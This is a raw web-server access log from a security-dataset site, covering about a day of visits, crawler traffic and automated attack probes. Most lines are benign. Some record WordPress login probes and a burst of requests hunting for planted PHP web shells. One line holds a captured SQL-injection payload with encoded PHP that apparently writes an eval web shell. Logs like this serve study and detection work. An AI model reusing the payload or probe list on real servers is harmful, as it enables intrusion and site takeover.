54.36.150.175 - - [21/Mar/2019:02:12:01 -0700] "GET /self.logs/2015/error.log.2015-10-26.gz HTTP/1.1" 200 907 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
166.111.68.22 - - [21/Mar/2019:22:48:00 -0700] "GET /Datasets%20Description/Network/dhcp.html HTTP/1.1" 200 1355 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:48:00 -0700] "GET /favicon.ico HTTP/1.1" 200 267 "http://www.secrepo.com/Datasets%20Description/Network/dhcp.html" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:48:26 -0700] "GET /Datasets%20Description/Network/dns.html HTTP/1.1" 200 1437 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:48:34 -0700] "GET /maccdc2012/dns.log.gz HTTP/1.1" 200 6629420 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
124.205.131.210 - - [21/Mar/2019:22:51:06 -0700] "GET / HTTP/1.1" 301 483 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
124.205.131.210 - - [21/Mar/2019:22:51:07 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
124.205.131.210 - - [21/Mar/2019:22:51:08 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
124.205.131.210 - - [21/Mar/2019:22:51:10 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
124.205.131.210 - - [21/Mar/2019:22:51:11 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27788 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
54.36.149.66 - - [21/Mar/2019:22:52:13 -0700] "GET /self.logs/error.log.2017-07-21.gz HTTP/1.1" 200 781 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
166.111.68.22 - - [21/Mar/2019:22:53:14 -0700] "GET /Datasets%20Description/HTML_Bro_log_1 HTTP/1.1" 301 552 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:53:15 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ HTTP/1.1" 200 733 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:53:22 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/app_stats.html HTTP/1.1" 200 1485 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
166.111.68.22 - - [21/Mar/2019:22:53:28 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/dns.html HTTP/1.1" 200 1731 "http://www.secrepo.com/Datasets%20Description/HTML_Bro_log_1/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
54.36.150.1 - - [21/Mar/2019:23:02:01 -0700] "GET /self.logs/access.log.2015-04-16.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
124.205.131.210 - - [21/Mar/2019:22:51:39 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 6871962 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
124.205.131.210 - - [21/Mar/2019:23:05:25 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 57674 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
54.36.150.184 - - [21/Mar/2019:23:07:46 -0700] "GET /self.logs/access.log.2017-08-16.gz HTTP/1.1" 200 21405 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.222 - - [21/Mar/2019:23:18:03 -0700] "GET /self.logs/2016/access.log.2016-10-01.gz HTTP/1.1" 200 6068 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.104 - - [21/Mar/2019:23:21:07 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
74.208.214.146 - - [21/Mar/2019:23:22:11 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.66 Safari/537.36" 
54.36.150.26 - - [21/Mar/2019:23:22:40 -0700] "GET /self.logs/2016/access.log.2016-02-01.gz HTTP/1.1" 200 6872 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.75 - - [21/Mar/2019:23:25:03 -0700] "GET /self.logs/2015/access.log.2015-01-29.gz HTTP/1.1" 200 8355 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
110.54.248.189 - - [21/Mar/2019:23:28:52 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
110.54.248.189 - - [21/Mar/2019:23:28:52 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
166.111.68.22 - - [21/Mar/2019:23:34:23 -0700] "GET /Datasets%20Description/PE_malware/Zeus.html HTTP/1.1" 200 1592 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
113.171.224.176 - - [21/Mar/2019:23:35:32 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 61320 "-" "Mozilla/5.0 Gecko/20100115 Firefox/3.6" 
196.70.30.65 - - [21/Mar/2019:23:36:47 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
196.70.30.65 - - [21/Mar/2019:23:36:48 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
166.111.68.22 - - [21/Mar/2019:23:35:58 -0700] "GET /tg/tg_snort_full.7z HTTP/1.1" 200 8847794 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.119 Safari/537.36" 
207.46.13.104 - - [21/Mar/2019:23:39:07 -0700] "GET /self.logs/?C=M;O=A HTTP/1.1" 200 16040 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
162.210.196.98 - - [21/Mar/2019:23:40:20 -0700] "GET /robots.txt HTTP/1.1" 200 289 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
162.210.196.98 - - [21/Mar/2019:23:40:23 -0700] "GET / HTTP/1.1" 200 46368 "-" "Mozilla/5.0 (compatible; MJ12bot/v1.4.8; http://mj12bot.com/)" 
114.241.43.127 - - [21/Mar/2019:23:41:08 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.98 Safari/537.36 LBBROWSER" 
111.204.219.193 - - [21/Mar/2019:23:45:04 -0700] "GET /favicon.ico HTTP/1.1" 200 268 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36" 
54.36.148.49 - - [21/Mar/2019:23:49:17 -0700] "GET /robots.txt HTTP/1.1" 301 446 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.49 - - [21/Mar/2019:23:49:17 -0700] "GET /robots.txt HTTP/1.1" 200 304 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.104 - - [21/Mar/2019:23:49:38 -0700] "GET /self.logs/access.log.2017-10-25.gz HTTP/1.1" 200 21347 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
199.80.52.17 - - [21/Mar/2019:23:51:13 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279362 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/33.0.1750.154 Safari/537.36" 
54.36.148.213 - - [21/Mar/2019:23:51:39 -0700] "GET /self.logs/access.log.2017-06-04.gz HTTP/1.1" 200 25015 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.61 - - [21/Mar/2019:23:52:05 -0700] "GET /self.logs/access.log.2017-05-09.gz HTTP/1.1" 200 19708 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.60 - - [21/Mar/2019:23:55:18 -0700] "GET /self.logs/error.log.2017-01-17.gz HTTP/1.1" 200 852 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
124.205.131.210 - - [21/Mar/2019:23:55:41 -0700] "GET /maccdc2012/http.log.gz HTTP/1.1" 200 72154 "http://www.secrepo.com/" "Mozilla/5.0 (X11; Linux x86_64; rv:52.0) Gecko/20100101 Firefox/52.0" 
37.47.8.167 - - [21/Mar/2019:23:56:22 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
37.47.8.167 - - [21/Mar/2019:23:56:24 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
37.47.8.167 - - [21/Mar/2019:23:56:24 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
37.47.8.167 - - [21/Mar/2019:23:56:27 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/73.0.3683.86 Safari/537.36" 
54.36.148.136 - - [21/Mar/2019:23:56:45 -0700] "GET /self.logs/error.log.2017-04-30.gz HTTP/1.1" 200 1158 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.154 - - [21/Mar/2019:23:57:01 -0700] "GET /self.logs/error.log.2016-04-24.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.86 - - [22/Mar/2019:00:01:40 -0700] "GET /self.logs/2016/access.log.2016-11-22.gz HTTP/1.1" 200 10393 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
216.244.66.245 - - [22/Mar/2019:00:04:30 -0700] "GET /robots.txt HTTP/1.1" 200 233 "-" "Mozilla/5.0 (compatible; DotBot/1.1; http://www.opensiteexplorer.org/dotbot, help@moz.com)" 
54.36.149.10 - - [22/Mar/2019:00:06:39 -0700] "GET /self.logs/2016/error.log.2016-04-15.gz HTTP/1.1" 200 554 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.149.71 - - [22/Mar/2019:00:08:34 -0700] "GET /self.logs/2016/access.log.2016-03-04.gz HTTP/1.1" 200 10961 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.154 - - [22/Mar/2019:00:09:50 -0700] "GET /self.logs/error.log.2015-05-27.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
91.211.247.18 - - [22/Mar/2019:00:10:17 -0700] "GET /honeypot/Honeypot%20-%20Howto.pdf HTTP/1.1" 200 1279418 "http://www.secrepo.com/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36 OPR/52.0.2871.64" 
54.36.150.42 - - [22/Mar/2019:00:10:28 -0700] "GET /self.logs/error.log.2017-01-26.gz HTTP/1.1" 200 1285 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.148.46 - - [22/Mar/2019:00:13:38 -0700] "GET /self.logs/access.log.2017-06-28.gz HTTP/1.1" 200 31151 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
157.55.39.175 - - [22/Mar/2019:00:13:46 -0700] "GET /self.logs/access.log.2017-04-23.gz HTTP/1.1" 200 14846 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
223.226.74.101 - - [22/Mar/2019:00:15:55 -0700] "GET /wp-login.php HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
223.226.74.101 - - [22/Mar/2019:00:15:56 -0700] "GET / HTTP/1.1" 418 732 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:40.0) Gecko/20100101 Firefox/40.1" 
129.121.176.193 - - [22/Mar/2019:00:21:09 -0700] "GET /wp-admin/ HTTP/1.1" 301 479 "-" "-" 
192.187.116.250 - - [22/Mar/2019:00:22:50 -0700] "GET //user.php?act=login HTTP/1.1" 404 295 "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a324d75634768774a79776e50443977614841675a585a686243676b5831425055315262593130704f79412f506e6834654363702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
192.187.116.250 - - [22/Mar/2019:00:22:51 -0700] "GET //c.php HTTP/1.1" 404 239 "http://www.secrepo.com//c.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
66.102.9.141 - - [22/Mar/2019:00:24:42 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
66.102.9.139 - - [22/Mar/2019:00:24:43 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 590 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/49.0.2623.75 Safari/537.36 Google Favicon" 
211.249.40.18 - - [22/Mar/2019:00:24:56 -0700] "GET / HTTP/1.1" 200 46413 "http://www.secrepo.com/" "Mozilla/5.0 (compatible; MSIE 8.0; Windows NT 6.1; Win64; x64; Windows NT 6.1; Trident/5.0)" 
217.31.67.131 - - [22/Mar/2019:00:26:17 -0700] "GET / HTTP/1.1" 200 12511 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
217.31.67.131 - - [22/Mar/2019:00:26:18 -0700] "GET /twitter-icon.png HTTP/1.1" 200 27787 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
217.31.67.131 - - [22/Mar/2019:00:26:18 -0700] "GET /GitHub-Mark.png HTTP/1.1" 200 7428 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
217.31.67.131 - - [22/Mar/2019:00:26:18 -0700] "GET /bootstrap/img/favicon.ico HTTP/1.1" 200 589 "http://www.secrepo.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/72.0.3626.121 Safari/537.36" 
54.36.150.133 - - [22/Mar/2019:00:26:32 -0700] "GET /self.logs/access.log.2017-05-15.gz HTTP/1.1" 200 39577 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
54.36.150.103 - - [22/Mar/2019:00:27:15 -0700] "GET /self.logs/access.log.2016-02-02.gz HTTP/1.1" 404 284 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
182.45.203.66 - - [22/Mar/2019:00:28:37 -0700] "GET / HTTP/1.1" 200 46424 "http://www.secrepo.com/" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:38 -0700] "POST /include/taglib/ty.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/ty.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:38 -0700] "POST /include/taglib/xt.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/xt.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
109.234.161.36 - - [22/Mar/2019:00:28:39 -0700] "GET /test/wp-admin/ HTTP/1.1" 301 489 "-" "-" 
182.45.203.66 - - [22/Mar/2019:00:28:39 -0700] "POST /include/taglib/xs.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/xs.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:39 -0700] "POST /include/taglib/lanmu.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/lanmu.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:39 -0700] "POST /include/taglib/findgs.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/findgs.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:39 -0700] "POST /include/taglib/201811xt.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/201811xt.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:40 -0700] "POST /include/taglib/2018fa.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/2018fa.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:40 -0700] "POST /include/taglib/2018gf.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/2018gf.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:40 -0700] "POST /include/tpllib/da5.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/tpllib/da5.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:40 -0700] "POST /include/taglib/cheng.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/cheng.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:41 -0700] "POST /include/taglib/lu.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/lu.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:41 -0700] "POST /include/taglib/shell.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/shell.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:41 -0700] "POST /include/taglib/jr.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/jr.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:41 -0700] "POST /include/taglib/yibuji.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/yibuji.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:42 -0700] "POST /include/taglib/dedellb.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/dedellb.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:42 -0700] "POST /include/taglib/asd.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/asd.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:42 -0700] "POST /include/taglib/new.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/new.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:42 -0700] "POST /include/taglib/cccea.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/cccea.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:43 -0700] "POST /include/taglib/datas.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/datas.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:43 -0700] "POST /include/taglib/2018fa.lib.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/2018fa.lib.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:43 -0700] "POST /lx.php HTTP/1.1" 404 294 "http://www.secrepo.com/lx.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:43 -0700] "POST /include/taglib/lins.php HTTP/1.1" 404 294 "http://www.secrepo.com/include/taglib/lins.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:44 -0700] "POST //data/cache/asd.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/asd.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:44 -0700] "POST //plus/result.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/result.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:44 -0700] "POST //plus/geflisroi.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/geflisroi.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:44 -0700] "POST //plus/read.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/read.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:45 -0700] "POST //config/AspCms_Config.asp HTTP/1.1" 404 294 "http://www.secrepo.com//config/AspCms_Config.asp" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:45 -0700] "POST //plus/moon.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/moon.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:45 -0700] "POST //plus/mytag_js.php?aid=9090 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:45 -0700] "POST //plus/mytag_js.php?aid=9090 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:45 -0700] "POST //plus/mytag_js.php?aid=9090 HTTP/1.1" 404 294 "http://www.secrepo.com//plus/mytag_js.php?aid=9090" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:46 -0700] "POST //data/cache/flye.php HTTP/1.1" 404 294 "http://www.secrepo.com//data/cache/flye.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
182.45.203.66 - - [22/Mar/2019:00:28:46 -0700] "POST //plus/skjszv.php HTTP/1.1" 404 294 "http://www.secrepo.com//plus/skjszv.php" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" 
54.36.149.99 - - [22/Mar/2019:00:32:46 -0700] "GET /self.logs/access.log.2019-02-04.gz HTTP/1.1" 200 18225 "-" "Mozilla/5.0 (compatible; AhrefsBot/6.1; +http://ahrefs.com/robot/)" 
207.46.13.132 - - [22/Mar/2019:00:33:10 -0700] "GET /Datasets%20Description/HTML_Bro_log_2/dns.html HTTP/1.1" 304 189 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)" 
